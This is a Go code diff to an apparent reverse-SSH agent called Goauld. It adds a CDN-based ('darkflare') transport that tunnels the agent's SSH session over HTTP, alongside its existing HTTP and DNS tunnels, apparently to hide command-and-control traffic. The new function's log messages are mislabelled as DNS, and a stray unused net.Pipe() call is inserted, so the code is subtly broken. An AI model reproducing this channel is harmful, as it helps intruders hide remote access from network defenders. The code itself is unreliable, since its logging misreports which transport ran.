@@ -2,6 +2,7 @@
 package ssh
 
 import (
+	"Goauld/agent/ssh/transport/darkflare"
 	"Goauld/agent/ssh/transport/http"
 	"context"
 	"errors"
@@ -78,7 +79,19 @@ func getProxiedClient(ctx context.Context, sshConfig *ssh.ClientConfig, dnsTrans
 					_ = ssHTTP.Close()
 					cancel()
 				}
-
+			case strings.HasPrefix(proto, "cdn"):
+				c, ssHTTP := proxyDarkflare(ctx, sshConfig, id)
+				client = c
+				if client != nil {
+					conn = ssHTTP
+					closer = conn
+					resultChan <- "CDN"
+				} else {
+					if ssHTTP != nil {
+						_ = ssHTTP.Close()
+					}
+					cancel()
+				}
 			case strings.HasPrefix(proto, "dns"):
 				if dnsTransport != nil {
 					client, conn = proxyDNS(sshConfig, dnsTransport, id)
@@ -267,6 +280,31 @@ func proxyDNS(sshConfig *ssh.ClientConfig, dnsTransport *transport.DNSSH, id str
 	return client, dnsTransport.SSHStream
 }
 
+func proxyDarkflare(ctx context.Context, sshConfig *ssh.ClientConfig, id string) (*ssh.Client, net.Conn) {
+	conn1, conn2 := net.Pipe()
+	httpClient := darkflare.NewClient(
+		config.Get().CDNURL(config.Get().ID),
+		80,
+		"http",
+		config.Get().CDNURL(config.Get().ID),
+		true,
+		"",
+		"",
+		"",
+		true,
+	)
+	go httpClient.HandleConnection(conn1, ctx)
+	client, err := tryProxySSH(sshConfig, conn2, id)
+	if err != nil {
+		log.Error().Str("Mode", "DNSSH").Err(err).Msg("failed to proxy ssh connection using DNS")
+
+		return nil, nil
+	}
+	log.Info().Str("Mode", "DNSSH").Msg("Proxy using DNS succeeded")
+
+	return client, conn2
+}
+
 // tryProxySSH attempts to proxies the SSH connection using the provided net.Conn
 // A 30-second timeout is used if the underlying connection hangs without being fully established
 // or without failure.
@@ -275,6 +313,7 @@ func tryProxySSH(conf *ssh.ClientConfig, netConn net.Conn, id string) (*ssh.Clie
 	chanErr := make(chan error)
 
 	var err error
+	net.Pipe()
 
 	go func() {
 		_conn, ch, req, _err := ssh.NewClientConn(netConn, config.Get().WSshURL(id), conf)
